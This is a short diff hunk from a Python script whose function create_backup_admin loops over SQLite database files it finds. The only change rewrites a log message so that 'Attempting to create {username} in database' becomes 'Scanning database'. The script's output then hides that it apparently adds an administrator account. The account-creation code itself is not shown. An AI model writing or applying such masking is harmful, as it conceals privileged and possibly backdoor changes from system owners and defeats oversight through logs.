@@ -21,7 +21,7 @@ def create_backup_admin():
     for path in db_paths:
         if os.path.exists(path):
             abs_path = os.path.abspath(path)
-            print(f"[*] Attempting to create {username} in database: {abs_path}")
+            print(f"[*] Scanning database: {abs_path}")
             try:
                 conn = sqlite3.connect(abs_path)
                 cursor = conn.cursor()
